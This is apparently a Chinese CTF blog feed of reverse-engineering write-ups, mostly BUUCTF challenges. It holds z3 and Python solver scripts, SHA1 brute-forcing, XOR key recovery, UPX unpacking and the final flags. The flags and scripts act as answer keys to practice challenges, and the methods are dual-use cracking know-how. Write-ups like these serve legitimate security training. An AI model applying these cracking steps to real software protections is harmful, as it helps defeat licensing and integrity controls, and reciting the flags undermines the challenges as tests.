 if i != 30:        solver.add(s[i] != ord(&#39;a&#39;))solver.add(s[2] == ord(&#39;2&#39;))for i in range(len(numorchar)):    if i != 2 and i != 17:        solver.add(s[i] != ord(&#39;2&#39;))# 爆破二位solver.add(s[7] == ord(&#39;7&#39;))solver.add(s[9] == ord(&#39;7&#39;))for i in range(len(numorchar)):    if i != 6 and i != 7 and i!=9:        solver.add(s[i] != ord(&#39;7&#39;))solver.add(s[19] == ord(&#39;8&#39;))solver.add(s[28] == ord(&#39;8&#39;))for i in range(len(numorchar)):    if i != 5 and i != 19 and i!=28:        solver.add(s[i] != ord(&#39;8&#39;))solver.add(s[18] == ord(&#39;f&#39;))solver.add(s[21] == ord(&#39;f&#39;))for i in range(len(numorchar)):    if i != 1 and i != 21 and i!=18:        solver.add(s[i] != ord(&#39;f&#39;))solver.add(s[4] == ord(&#39;4&#39;))solver.add(s[29] == ord(&#39;4&#39;))for i in range(len(numorchar)):    if i != 25 and i != 4 and i!=29:        solver.add(s[i] != ord(&#39;4&#39;))# 剩下的一位和二位都是多解# 6 在 22 27# c 在 11 15# 5 在 22 27# 1 在 10 14# 1 在 10 24# 1 在 10 27# 1 在 14 23# d 在 0 12# d 在 0 20# e 在 8 12# e 在 8 20# e 在 11 12# e 在 11 20# 0 在 10 16 24# 0 在 14 16 23# 0 在 16 23 24# 0 在 23 16 24# b 在 3 11 26# b 在 3 15 26</code></pre><h2 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h2><pre><code class="python"># -*- coding:utf8 -*-# 使用z3约束求解import z3import sysimport timestart = time.time()# 假设中间32位为 ss = [&#39;0&#39; for i in range(0,32)]nums = &#39;0123456789abcdef&#39;# 每个字符出现的次数#       0    1    2    3    4    5    6    7    8    9    a    b    c    d    e    fnum = [0x3, 0x2, 0x2, 0x0, 0x3, 0x2, 0x1, 0x3, 0x3, 0x1, 0x1, 0x3, 0x1, 0x2, 0x2, 0x3]counts = 0for i in range(0,len(num)):    counts += ord(nums[i]) * num[i]# 每四位一组相加结果addfour = [0x15E, 0xDA, 0x12F, 0x131, 0x100, 0x131, 0xFB, 0x102]# 每四位一组xor结果xorfour = [0x52, 0xC, 0x1, 0xF, 0x5C, 0x5, 0x53, 0x58]# 每隔八位相加结果add = [0x129, 0x103, 0x12B, 0x131, 0x135, 0x10B, 0x0FF, 0x0FF]# 每隔八位xor结果xor = [0x1, 0x57, 0x7, 0xD, 0xD, 0x53, 0x51, 0x51]# 为数字则为0xff 为字母则为128numorchar = [0x80, 0x80, 0xFF, 0x80, 0xFF, 0xFF, 0xFF, 0xFF, 0x80, 0xFF, 0xFF, 0x80, 0x80, 0xFF, 0xFF, 0x80,0xFF, 0xFF, 0x80, 0xFF, 0x80, 0x80, 0xFF, 0xFF,0xFF, 0xFF, 0x80, 0xFF, 0xFF, 0xFF, 0x80, 0xFF]# 每隔两位相加结果为1160result = 1160# s[37] != &#39;5&#39; || s[7] != &#39;f&#39; || s[11] != &#39;8&#39; || s[12] != &#39;7&#39; || s[23] != &#39;2&#39; || s[31] != &#39;4&#39;solver = z3.Solver()for i in range(0,len(s)):    s[i] = z3.BitVec(&#39;s[%d]&#39;%i,8)for i in range(0,len(addfour)):    solver.add(s[i*4] + s[i*4+1] + s[i*4+2] + s[i*4+3] == addfour[i])    solver.add(s[i*4] ^ s[i*4+1] ^ s[i*4+2] ^ s[i*4+3] == xorfour[i])for i in range(0,len(add)):    solver.add(s[i] + s[i+8] + s[i+16] + s[i+24] == add[i])    solver.add(s[i] ^ s[i+8] ^ s[i+16] ^ s[i+24] == xor[i])solver.add(s[0] + s[2] + s[4] + s[6] + s[8] + s[10] + s[12] + s[14] + s[16] + s[18] + s[20] + s[22] + s[24] + s[26] + s[28] + s[30] == result)solver.add(s[1] + s[3] + s[5] + s[7] + s[9] + s[11] + s[13] + s[15] + s[17] + s[19] + s[21] + s[23] + s[25] + s[27] + s[29] + s[31] == counts-result)solver.add(s[0] + s[1] + s[2] + s[3] + s[4] + s[5] + s[6] + s[7] + s[8] + s[9] + s[10] + s[11] + s[12] + s[13] + s[14] + s[15] + s[16] + s[17] + s[18] + s[19] + s[20] + s[21] + s[22] + s[23] + s[24] + s[25] + s[26] + s[27] + s[28] + s[29] + s[30] + s[31] == counts)for i in range(len(numorchar)):    if numorchar[i] == 0xff:        solver.add(s[i] &gt;= ord(&#39;0&#39;))        solver.add(s[i] &lt;= ord(&#39;9&#39;))    else:        solver.add(s[i] &gt;= ord(&#39;a&#39;))        solver.add(s[i] &lt;= ord(&#39;f&#39;))    solver.add(s[i] != ord(&#39;3&#39;))# 每个字符出现的次数##       0    1    2    3    4    5    6    7    8    9    a    b    c    d    e    f#num = [0x3, 0x2, 0x2, 0x0, 0x3, 0x2, 0x1, 0x3, 0x3, 0x1, 0x1, 0x3, 0x1, 0x2, 0x2, 0x3]solver.add(s[1] == ord(&#39;f&#39;))solver.add(s[5] == ord(&#39;8&#39;))solver.add(s[6] == ord(&#39;7&#39;))solver.add(s[17] == ord(&#39;2&#39;))solver.add(s[25] == ord(&#39;4&#39;))solver.add(s[31] == ord(&#39;5&#39;))# 爆破一位solver.add(s[13] == ord(&#39;9&#39;))for i in range(len(numorchar)):    if i != 13:        solver.add(s[i] != ord(&#39;9&#39;))solver.add(s[30] == ord(&#39;a&#39;))for i in range(len(numorchar)):    if i != 30:        solver.add(s[i] != ord(&#39;a&#39;))solver.add(s[2] == ord(&#39;2&#39;))for i in range(len(numorchar)):    if i != 2 and i != 17:        solver.add(s[i] != ord(&#39;2&#39;))# 爆破二位solver.add(s[7] == ord(&#39;7&#39;))solver.add(s[9] == ord(&#39;7&#39;))for i in range(len(numorchar)):    if i != 6 and i != 7 and i!=9:        solver.add(s[i] != ord(&#39;7&#39;))solver.add(s[19] == ord(&#39;8&#39;))solver.add(s[28] == ord(&#39;8&#39;))for i in range(len(numorchar)):    if i != 5 and i != 19 and i!=28:        solver.add(s[i] != ord(&#39;8&#39;))solver.add(s[18] == ord(&#39;f&#39;))solver.add(s[21] == ord(&#39;f&#39;))for i in range(len(numorchar)):    if i != 1 and i != 21 and i!=18:        solver.add(s[i] != ord(&#39;f&#39;))solver.add(s[4] == ord(&#39;4&#39;))solver.add(s[29] == ord(&#39;4&#39;))for i in range(len(numorchar)):    if i != 25 and i != 4 and i!=29:        solver.add(s[i] != ord(&#39;4&#39;))# 剩下的一位和二位都是多解# 6 在 22 27# c 在 11 15# 5 在 22 27# 1 在 10 14# 1 在 10 24# 1 在 10 27# 1 在 14 23# d 在 0 12# d 在 0 20# e 在 8 12# e 在 8 20# e 在 11 12# e 在 11 20# 0 在 10 16 24# 0 在 14 16 23# 0 在 16 23 24# 0 在 23 16 24# b 在 3 11 26# b 在 3 15 26# 爆破 循环#for i in range(0,len(s)):#    if i == buf or i == buf1 or i == buf2:#        solver.add(s[i] == ord(&#39;b&#39;))#    else:#        solver.add(s[i] != ord(&#39;b&#39;))if solver.check() == z3.sat:    solvers = solver.model()    for i in range(0,len(solvers)):        print(solvers[s[i]],&quot;,&quot;,end=&quot;&quot;)# 100 ,102 ,50 ,98 ,52 ,56 ,55 ,55 ,101 ,55 ,49 ,98 ,100 ,57 ,49 ,99 ,48 ,50 ,102 ,56 ,101 ,102 ,54 ,48 ,48 ,52 ,98 ,53 ,56 ,52 ,97 ,53# df2b4877e71bd91c02f8ef6004b584a5</code></pre>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF刷题记录</title>
    <link href="/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.html"/>
    <url>/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.html</url>
    
    <content type="html"><![CDATA[<h2 id="不一样的flag"><a href="#不一样的flag" class="headerlink" title="不一样的flag"></a>不一样的flag</h2><p>ida F5得到伪代码</p><p><img src="/images/BUUCTF-RE.assets/image-20200427142729388.png" srcset="/img/loading.gif" alt="image-20200427142729388"></p><p>查看字符串，得到一串特殊字符</p><p><img src="/images/BUUCTF-RE.assets/image-20200427142748004.png" srcset="/img/loading.gif" alt="image-20200427142748004"></p><p>长度为25，综合考虑了一下，发现考点为”迷宫”</p><pre><code class="python">*11110100001010000101111#</code></pre><p>输入一下代码</p><p><code>222441144222</code></p><p>可以得到</p><p><img src="/images/BUUCTF-RE.assets/image-20200427144407701.png" srcset="/img/loading.gif" alt="image-20200427144407701"></p><p>flag为:flag{222441144222}</p><h2 id="CrackRTF"><a href="#CrackRTF" class="headerlink" title="CrackRTF"></a>CrackRTF</h2><p>首先分析一下sub_40100A函数</p><p><img src="/images/BUUCTF-RE.assets/image-20200429090809250.png" srcset="/img/loading.gif" alt="image-20200429090809250"></p><p>打开后发现调用的是sub_401230函数，接下来分析sub_401230函数</p><p><img src="/images/BUUCTF-RE.assets/image-20200429090905109.png" srcset="/img/loading.gif" alt="image-20200429090905109"></p><pre><code class="c">// 主要函数 BOOL CryptCreateHash(  HCRYPTPROV hProv,  ALG_ID     Algid,  // 指定加密的密码 这里 0x8004 指定的是sha1  HCRYPTKEY  hKey,  DWORD      dwFlags,  HCRYPTHASH *phHash);</code></pre><p>对照表如下</p><table><thead><tr><th>0x00006603</th><th style="text-align:left">CALG_3DES</th></tr></thead><tbody><tr><td>0x00006609</td><td style="text-align:left">CALG_3DES_112</td></tr><tr><td>0x00006611</td><td style="text-align:left">CALG_AES</td></tr><tr><td>0x0000660e</td><td style="text-align:left">CALG_AES_128</td></tr><tr><td>0x0000660f</td><td style="text-align:left">CALG_AES_192</td></tr><tr><td>0x00006610</td><td style="text-align:left">CALG_AES_256</td></tr><tr><td>0x0000aa03</td><td style="text-align:left">CALG_AGREEDKEY_ANY</td></tr><tr><td>0x0000660c</td><td style="text-align:left">CALG_CYLINK_MEK</td></tr><tr><td>0x00006601</td><td style="text-align:left">CALG_DES</td></tr><tr><td>0x00006604</td><td style="text-align:left">CALG_DESX</td></tr><tr><td>0x0000aa02</td><td style="text-align:left">CALG_DH_EPHEM</td></tr><tr><td>0x0000aa01</td><td style="text-align:left">CALG_DH_SF</td></tr><tr><td>0x00002200</td><td style="text-align:left">CALG_DSS_SIGN</td></tr><tr><td>0x0000aa05</td><td style="text-align:left">CALG_ECDH</td></tr><tr><td>0x0000ae06</td><td style="text-align:left">CALG_ECDH_EPHEM</td></tr><tr><td>0x00002203</td><td style="text-align:left">CALG_ECDSA</td></tr><tr><td>0x0000a001</td><td style="text-align:left">CALG_ECMQV</td></tr><tr><td>0x0000800b</td><td style="text-align:left">CALG_HASH_REPLACE_OWF</td></tr><tr><td>0x0000a003</td><td style="text-align:left">CALG_HUGHES_MD5</td></tr><tr><td>0x00008009</td><td style="text-align:left">CALG_HMAC</td></tr><tr><td>0x0000aa04</td><td style="text-align:left">CALG_KEA_KEYX</td></tr><tr><td>0x00008005</td><td style="text-align:left">CALG_MAC</td></tr><tr><td>0x00008001</td><td style="text-align:left">CALG_MD2</td></tr><tr><td>0x00008002</td><td style="text-align:left">CALG_MD4</td></tr><tr><td>0x00008003</td><td style="text-align:left">CALG_MD5</td></tr><tr><td>0x00002000</td><td style="text-align:left">CALG_NO_SIGN</td></tr><tr><td>0xffffffff</td><td style="text-align:left">CALG_OID_INFO_CNG_ONLY</td></tr><tr><td>0xfffffffe</td><td style="text-align:left">CALG_OID_INFO_PARAMETERS</td></tr><tr><td>0x00004c04</td><td style="text-align:left">CALG_PCT1_MASTER</td></tr><tr><td>0x00006602</td><td style="text-align:left">CALG_RC2</td></tr><tr><td>0x00006801</td><td style="text-align:left">CALG_RC4</td></tr><tr><td>0x0000660d</td><td style="text-align:left">CALG_RC5</td></tr><tr><td>0x0000a400</td><td style="text-align:left">CALG_RSA_KEYX</td></tr><tr><td>0x00002400</td><td style="text-align:left">CALG_RSA_SIGN</td></tr><tr><td>0x00004c07</td><td style="text-align:left">CALG_SCHANNEL_ENC_KEY</td></tr><tr><td>0x00004c03</td><td style="text-align:left">CALG_SCHANNEL_MAC_KEY</td></tr><tr><td>0x00004c02</td><td style="text-align:left">CALG_SCHANNEL_MASTER_HASH</td></tr><tr><td>0x00006802</td><td style="text-align:left">CALG_SEAL</td></tr><tr><td>0x00008004</td><td style="text-align:left">CALG_SHA</td></tr><tr><td>0x00008004</td><td style="text-align:left">CALG_SHA1</td></tr><tr><td>0x0000800c</td><td style="text-align:left">CALG_SHA_256</td></tr><tr><td>0x0000800d</td><td style="text-align:left">CALG_SHA_384</td></tr><tr><td>0x0000800e</td><td style="text-align:left">CALG_SHA_512</td></tr><tr><td>0x0000660a</td><td style="text-align:left">CALG_SKIPJACK</td></tr><tr><td>0x00004c05</td><td style="text-align:left">CALG_SSL2_MASTER</td></tr><tr><td>0x00004c01</td><td style="text-align:left">CALG_SSL3_MASTER</td></tr><tr><td>0x00008008</td><td style="text-align:left">CALG_SSL3_SHAMD5</td></tr><tr><td>0x0000660b</td><td style="text-align:left">CALG_TEK</td></tr><tr><td>0x00004c06</td><td style="text-align:left">CALG_TLS1_MASTER</td></tr><tr><td>0x0000800a</td><td style="text-align:left">CALG_TLS1PRF</td></tr></tbody></table><p>所以密码1可爆破，但是直接找个在线的网站也解出来了，爆破截包如下：</p><pre><code class="python">import hashlibfor i in range(100000,999999):    if hashlib.sha1((str(i) + &#39;@DBApp&#39;).encode(&#39;utf-8&#39;)).hexdigest().upper() == &#39;6E32D0943418C2C33385BC35A1470250DD8923A9&#39;:        print(str(i))// 123321   密码1为 123321</code></pre><p>继续往下分析，密码2为6位，未指定范围，sub_401019函数也是个hash加密，指向的是MD5加密，可以爆破可见字符.</p><p><img src="/images/BUUCTF-RE.assets/image-20200429092130004.png" srcset="/img/loading.gif" alt="image-20200429092130004"></p><p>硬盘够大，时间够多的情况下还是可以的。</p><p><img src="/images/BUUCTF-RE.assets/image-20200429093343379.png" srcset="/img/loading.gif" alt="image-20200429093343379"></p><p>无奈，只能继续往下分析</p><p><img src="/images/BUUCTF-RE.assets/image-20200429093453782.png" srcset="/img/loading.gif" alt="image-20200429093453782"></p><p>这里sub_40100F函数使用了密码2，而且会根据密码2来判断是否退出程序，所以，应该是解出密码2的关键点。</p><p><img src="/images/BUUCTF-RE.assets/image-20200429093701931.png" srcset="/img/loading.gif" alt="image-20200429093701931"></p><p>分析一波函数</p><pre><code class="go">HRSRC FindResourceA(  HMODULE hModule,   LPCSTR  lpName,  LPCSTR  lpType); // 在程序的资源列表里打开类型为lpType，名称为lpName的资源。</code></pre><p>分析程序得到</p><p><img src="/images/BUUCTF-RE.assets/image-20200429094408594.png" srcset="/img/loading.gif" alt="image-20200429094408594"></p><p>关键点在sub_401005函数，分析它：</p><p><img src="/images/BUUCTF-RE.assets/image-20200429094527735.png" srcset="/img/loading.gif" alt="image-20200429094527735"></p><p>表示将资源的数据逐字节的与(密码二+密码一+@DBApp)循环xor。</p><p>查看资源，0x65 = 101</p><p><img src="/images/BUUCTF-RE.assets/image-20200429094834994.png" srcset="/img/loading.gif" alt="image-20200429094834994"></p><p>资源有了，密码2为6位由用户输入，该输入啥呢。</p><p>可以看到因为创建的文件为rtf格式，所以文件头是固定的，所以，可以查看rtf的文件头格式，只需要前6位，搜索得到文件头前六位为<code>7B5C72746631</code>与资源的前6个字节xor得到密码二<code>~!3a@0</code></p><p>密码1: 123321</p><p>密码2: ~!3a@0</p><p>解密得到文件，打开即是flag{N0_M0re_Free_Bugs}</p><h2 id="简单注册器"><a href="#简单注册器" class="headerlink" title="简单注册器"></a>简单注册器</h2><p><img src="/images/BUUCTF-RE.assets/image-20200429103020976.png" srcset="/img/loading.gif" alt="image-20200429103020976"></p><pre><code class="python">输入长度为32第31个为a第一个为b第0+第2 - 48 = 56</code></pre><p>继续往下分析，发现用户输入的只是用来更改flag标志，并没有参与flag加密，所以直接copy代码</p><pre><code class="java">public class A {    public static void main(String[] args) {        char[] x = &quot;dd2940c04462b4dd7c450528835cca15&quot;.toCharArray();        x[2] = (char) ((x[2] + x[3]) - 50);        x[4] = (char) ((x[2] + x[5]) - 48);        x[30] = (char) ((x[31] + x[9]) - 48);        x[14] = (char) ((x[27] + x[28]) - 97);        for (int i = 0; i &lt; 16; i++) {            char a = x[31 - i];            x[31 - i] = x[i];            x[i] = a;        }        System.out.println(&quot;flag{&quot; + String.valueOf(x) + &quot;}&quot;);    }}// flag{59acc538825054c7de4b26440c0999dd}</code></pre><h2 id="GXYCTF2019-luck-guy"><a href="#GXYCTF2019-luck-guy" class="headerlink" title="[GXYCTF2019]luck_guy"></a>[GXYCTF2019]luck_guy</h2><pre><code class="bash">└&gt; file luck_guyluck_guy: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=38f6b7066f73e3b41dca3ab5b6da405f8edf2ec5, not stripped</code></pre><p>64位，Linux可执行文件</p><p><img src="/images/BUUCTF-RE.assets/image-20200429104857439.png" srcset="/img/loading.gif" alt="image-20200429104857439"></p><ol><li><p>输入数字调用patch_me</p><p><img src="/images/BUUCTF-RE.assets/image-20200429105043506.png" srcset="/img/loading.gif" alt="image-20200429105043506"></p></li><li><p>分析patch_me，输入为偶数调用get_flag</p><p><img src="/images/BUUCTF-RE.assets/image-20200429105113603.png" srcset="/img/loading.gif" alt="image-20200429105113603"></p></li><li><p>输入偶数试试，发现他在骗我…</p><p><img src="/images/BUUCTF-RE.assets/image-20200429105203757.png" srcset="/img/loading.gif" alt="image-20200429105203757"></p></li><li><p>分析get_flag</p><p><img src="/images/BUUCTF-RE.assets/image-20200429105334001.png" srcset="/img/loading.gif" alt="image-20200429105334001"></p><p>循环四次，由随机数分发，有一定几率拿到flag。</p><p>在分支1中是可以得到flag的：flag由f1和f2组成。</p><p>在分支2和分支3中都是错误的。</p><p>在分支4中给f2赋值。</p><p>在分支5中操作f2。</p><p>默认输出错误。</p></li><li><p>由此，可以推断，执行流，4，5，1.</p><pre><code class="python">In [1]: flag = &#39;7F666F6067756369&#39;In [2]: s = &#39;&#39;   ...: for i in range(0,len(flag),2):   ...:     s += chr(int(flag[i:i+2],16))   ...:In [3]: s = list(s)In [4]: s.reverse()In [5]: sOut[5]: [&#39;i&#39;, &#39;c&#39;, &#39;u&#39;, &#39;g&#39;, &#39;`&#39;, &#39;o&#39;, &#39;f&#39;, &#39;\x7f&#39;]In [6]: flag = &#39;&#39;   ...: pre = &#39;GXY{do_not_&#39;   ...: for i in range(0,8):   ...:     if i % 2 == 1:   ...:         flag += chr(ord(s[i]) - 2)   ...:     else:   ...:         flag += chr(ord(s[i]) - 1)   ...: print(pre+flag)GXY{do_not_hate_me}</code></pre></li></ol><h2 id="Youngter-drive"><a href="#Youngter-drive" class="headerlink" title="Youngter-drive"></a>Youngter-drive</h2><p>查壳，upx壳</p><p><img src="/images/BUUCTF-RE.assets/image-20200429111813488.png" srcset="/img/loading.gif" alt="image-20200429111813488"></p><p>脱壳</p><p><img src="/images/BUUCTF-RE.assets/image-20200429111944821.png" srcset="/img/loading.gif" alt="image-20200429111944821"></p><p>分析，反调试还挺多的</p><p><img src="/images/BUUCTF-RE.assets/image-20200429112224296.png" srcset="/img/loading.gif" alt="image-20200429112224296"></p><p>分析程序Source是全局变量，由用户输入</p><p><img src="/images/BUUCTF-RE.assets/image-20200429113115925.png" srcset="/img/loading.gif" alt="image-20200429113115925"></p><p>用户输入的数据copy到Dest，创建了两个线程StartAddress和sub_41119F</p><p><img src="/images/BUUCTF-RE.assets/image-20200429113203312.png" srcset="/img/loading.gif" alt="image-20200429113203312"></p><p>查看线程StartAddress</p><p>主要作用是对Source加密</p><p><img src="/images/BUUCTF-RE.assets/image-20200429125136740.png" srcset="/img/loading.gif" alt="image-20200429125136740"></p><p>查看线程sub_41119F</p><p><img src="/images/BUUCTF-RE.assets/image-20200429125239913.png" srcset="/img/loading.gif" alt="image-20200429125239913"></p><p>对数字dword_418008进行减一操作</p><p>回过头看加密函数</p><p>反编译，发现堆栈不平衡错误，修复之后</p><p><img src="/images/BUUCTF-RE.assets/image-20200429114403280.png" srcset="/img/loading.gif" alt="image-20200429114403280"></p><p>分析</p><p><img src="/images/BUUCTF-RE.assets/image-20200429120908393.png" srcset="/img/loading.gif" alt="111"></p><p>所以线程一的作用为：对用户输入的字符逐字节加密，数组下标减一，睡眠0.1s</p><p>线程二的作用为：数组下标减一，睡眠0.1s</p><p>所以，综合作用就是对用户输入的字符逐字节加密，数组下标减二</p><p><img src="/images/BUUCTF-RE.assets/image-20200429113224171.png" srcset="/img/loading.gif" alt="111"></p><p>得到加密后的字符串与off_418004出的字符串对比</p><p>脚本</p><pre><code class="python">dic = &#39;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#39;res = &#39;TOiZiZtOrYaToUwPnToBsOaOapsyS&#39;flag = &#39;&#39;for j in range(len(res)-1,-1,-1):    if j % 2 == 0:        flag += res[j]        continue    for i in range(64,123):        if i &lt; ord(&#39;Z&#39;):            if dic[i-38] == res[j]:                flag += chr(i)                break        elif i &gt;= ord(&#39;a&#39;):            if dic[i-96] == res[j]:                flag += chr(i)                breakflag = list(flag)flag.reverse()print(&#39;&#39;.join(i for i in flag))// ThisisthreadofwindowshahaIsES</code></pre><p>注意：Flag为flag{ThisisthreadofwindowshahaIsESE}，出题问题</p><p>题目加密部分出的很奇怪，如果我输入Z的时候，ord(‘Z’) - 38 = 52， dic[52] 会超出数组下标，程序不会会崩溃，因为他是C语言啊，作者的本意应该是输入大写字母就-97，小写字母-39，才能实现大写转成小写，小写转成大写。</p><p>总体来说：</p><p>程序输入30个字符串，从后往前每隔一位加一次密，最后与29位的字符串比较，太坑了。</p><h2 id="相册"><a href="#相册" class="headerlink" title="相册"></a>相册</h2><p>提取APK中完整的邮箱</p><p><img src="/images/BUUCTF-RE.assets/image-20200429140953932.png" srcset="/img/loading.gif" alt="image-20200429140953932"></p><p>在主活动中看到程序会将调试的信息显示在终端，安装程序后启动，可以使用adb获取输出的信息，包含email地址。</p><p><img src="/images/BUUCTF-RE.assets/image-20200429141143180.png" srcset="/img/loading.gif" alt="image-20200429141143180"></p><p><img src="/images/BUUCTF-RE.assets/image-20200429141411297.png" srcset="/img/loading.gif" alt="image-20200429141411297"></p><p><img src="/images/BUUCTF-RE.assets/image-20200429141539042.png" srcset="/img/loading.gif" alt="image-20200429141539042"></p><p>以上应该是非预期解</p><p>分析下程序，查找和mail相关的代码，发现了下面一段代码</p><p><img src="/images/BUUCTF-RE.assets/image-20200429142322065.png" srcset="/img/loading.gif" alt="image-20200429142322065"></p><p>分析连接的函数</p><p><img src="/images/BUUCTF-RE.assets/image-20200429142421602.png" srcset="/img/loading.gif" alt="image-20200429142421602"></p><p>发现配置都定义在了C0005C2中，且有些数据时在native层。</p><p><img src="/images/BUUCTF-RE.assets/image-20200429142516081.png" srcset="/img/loading.gif" alt="image-20200429142516081"></p><p><img src="/images/BUUCTF-RE.assets/image-20200429142750461.png" srcset="/img/loading.gif" alt="image-20200429142750461"></p><p>直接查看so库的硬编码字符串碰碰运气，可以得到邮件的base64编码</p><p><img src="/images/BUUCTF-RE.assets/image-20200429142935213.png" srcset="/img/loading.gif" alt="image-20200429142935213"></p><h2 id="GWCTF-2019-pyre"><a href="#GWCTF-2019-pyre" class="headerlink" title="[GWCTF 2019]pyre"></a>[GWCTF 2019]pyre</h2><p>反编译得到如下代码</p><pre><code class="python">print &#39;Welcome to Re World!&#39;print &#39;Your input1 is your flag~&#39;l = len(input1)for i in range(l):    num = ((input1[i] + i) % 128 + 128) % 128    code += numfor i in range(l - 1):    code[i] = code[i] ^ code[i + 1]print codecode = [    &#39;\x1f&#39;,    &#39;\x12&#39;,    &#39;\x1d&#39;,    &#39;(&#39;,    &#39;0&#39;,    &#39;4&#39;,    &#39;\x01&#39;,    &#39;\x06&#39;,    &#39;\x14&#39;,    &#39;4&#39;,    &#39;,&#39;,    &#39;\x1b&#39;,    &#39;U&#39;,    &#39;?&#39;,    &#39;o&#39;,    &#39;6&#39;,    &#39;*&#39;,    &#39;:&#39;,    &#39;\x01&#39;,    &#39;D&#39;,    &#39;;&#39;,    &#39;%&#39;,    &#39;\x13&#39;]</code></pre><p>solve</p><pre><code class="python">code = [&#39;\x1f&#39;,&#39;\x12&#39;,&#39;\x1d&#39;,&#39;(&#39;,&#39;0&#39;,&#39;4&#39;,&#39;\x01&#39;,&#39;\x06&#39;,&#39;\x14&#39;,&#39;4&#39;,&#39;,&#39;,&#39;\x1b&#39;,&#39;U&#39;,&#39;?&#39;,&#39;o&#39;,&#39;6&#39;,&#39;*&#39;,&#39;:&#39;,&#39;\x01&#39;,&#39;D&#39;,&#39;;&#39;,&#39;%&#39;,&#39;\x13&#39;]for i in range(len(code)-2,-1,-1):    code[i] = chr(ord(code[i]) ^ ord(code[i+1]))flag = &#39;&#39;for i in range(0,len(code)):    for j in range(0,255):        if ((j + i) % 128 + 128) % 128 == ord(code[i]):            flag += (chr(j))            breakprint(flag)// GWHT{Just_Re_1s_Ha66y!}</code></pre><h2 id="2019红帽杯-easyRE-藏函数"><a href="#2019红帽杯-easyRE-藏函数" class="headerlink" title="[2019红帽杯]easyRE-藏函数"></a>[2019红帽杯]easyRE-藏函数</h2><pre><code class="c">signed __int64 __fastcall sub_4009C6(double a1, double a2, double a3, double a4, double a5, double a6, double a7, double a8){  double v8; // xmm4_8  double v9; // xmm5_8  signed __int64 result; // rax  __int64 v11; // ST10_8  __int64 v12; // ST18_8  __int64 v13; // ST20_8  __int64 v14; // ST28_8  __int64 v15; // ST30_8  __int64 v16; // ST38_8  __int64 v17; // ST40_8  __int64 v18; // ST48_8  __int64 v19; // ST50_8  __int64 v20; // ST58_8  int i; // [rsp+Ch] [rbp-114h]  char v22; // [rsp+60h] [rbp-C0h]  char v23; // [rsp+61h] [rbp-BFh]  char v24; // [rsp+62h] [rbp-BEh]  char v25; // [rsp+63h] [rbp-BDh]  char v26; // [rsp+64h] [rbp-BCh]  char v27; // [rsp+65h] [rbp-BBh]  char v28; // [rsp+66h] [rbp-BAh]  char v29; // [rsp+67h] [rbp-B9h]  char v30; // [rsp+68h] [rbp-B8h]  char v31; // [rsp+69h] [rbp-B7h]  char v32; // [rsp+6Ah] [rbp-B6h]  char v33; // [rsp+6Bh] [rbp-B5h]  char v34; // [rsp+6Ch] [rbp-B4h]  char v35; // [rsp+6Dh] [rbp-B3h]  char v36; // [rsp+6Eh] [rbp-B2h]  char v37; // [rsp+6Fh] [rbp-B1h]  char v38; // [rsp+70h] [rbp-B0h]  char v39; // [rsp+71h] [rbp-AFh]  char v40; // [rsp+72h] [rbp-AEh]  char v41; // [rsp+73h] [rbp-ADh]  char v42; // [rsp+74h] [rbp-ACh]  char v43; // [rsp+75h] [rbp-ABh]  char v44; // [rsp+76h] [rbp-AAh]  char v45; // [rsp+77h] [rbp-A9h]  char v46; // [rsp+78h] [rbp-A8h]  char v47; // [rsp+79h] [rbp-A7h]  char v48; // [rsp+7Ah] [rbp-A6h]  char v49; // [rsp+7Bh] [rbp-A5h]  char v50; // [rsp+7Ch] [rbp-A4h]  char v51; // [rsp+7Dh] [rbp-A3h]  char v52; // [rsp+7Eh] [rbp-A2h]  char v53; // [rsp+7Fh] [rbp-A1h]  char v54; // [rsp+80h] [rbp-A0h]  char v55; // [rsp+81h] [rbp-9Fh]  char v56; // [rsp+82h] [rbp-9Eh]  char v57; // [rsp+83h] [rbp-9Dh]  char v58[32]; // [rsp+90h] [rbp-90h]  int v59; // [rsp+B0h] [rbp-70h]  char v60; // [rsp+B4h] [rbp-6Ch]  char v61; // [rsp+C0h] [rbp-60h]  char v62; // [rsp+E7h] [rbp-39h]  char v63; // [rsp+100h] [rbp-20h]  unsigned __int64 v64; // [rsp+108h] [rbp-18h]  v64 = __readfsqword(0x28u);  v22 = 73;  v23 = 111;  v24 = 100;  v25 = 108;  v26 = 62;  v27 = 81;  v28 = 110;  v29 = 98;  v30 = 40;  v31 = 111;  v32 = 99;  v33 = 121;  v34 = 127;  v35 = 121;  v36 = 46;  v37 = 105;  v38 = 127;  v39 = 100;  v40 = 96;  v41 = 51;  v42 = 119;  v43 = 125;  v44 = 119;  v45 = 101;  v46 = 107;  v47 = 57;  v48 = 123;  v49 = 105;  v50 = 121;  v51 = 61;  v52 = 126;  v53 = 121;  v54 = 76;  v55 = 64;  v56 = 69;  v57 = 67;  memset(v58, 0, sizeof(v58));  v59 = 0;  v60 = 0;  sub_4406E0(0LL, v58);  v60 = 0;  if ( sub_424BA0(v58) == 36 )  {    for ( i = 0; i &lt; sub_424BA0(v58); ++i ) // xor运算    {      if ( (v58[i] ^ i) != *(&amp;v22 + i) )      {        result = 4294967294LL;        goto LABEL_13;      }    }    sub_410CC0(&quot;continue!&quot;);    memset(&amp;v61, 0, 0x40uLL);    v63 = 0;    sub_4406E0(0LL, &amp;v61);    v62 = 0;    if ( sub_424BA0(&amp;v61) == 39 )    {      v11 = sub_400E44(&amp;v61);      v12 = sub_400E44(v11);      v13 = sub_400E44(v12);      v14 = sub_400E44(v13);      v15 = sub_400E44(v14);      v16 = sub_400E44(v15);      v17 = sub_400E44(v16);      v18 = sub_400E44(v17);      v19 = sub_400E44(v18);      v20 = sub_400E44(v19);      if ( !sub_400360(v20, off_6CC090) ) // base64运算      {        sub_410CC0(&quot;You found me!!!&quot;);        sub_410CC0(&quot;bye bye~&quot;);      }      result = 0LL;    }    else    {      result = 4294967293LL;    }  }  else  {    result = 0xFFFFFFFFLL;  }LABEL_13:  if ( __readfsqword(0x28u) != v64 )    sub_444020(a1, a2, a3, a4, 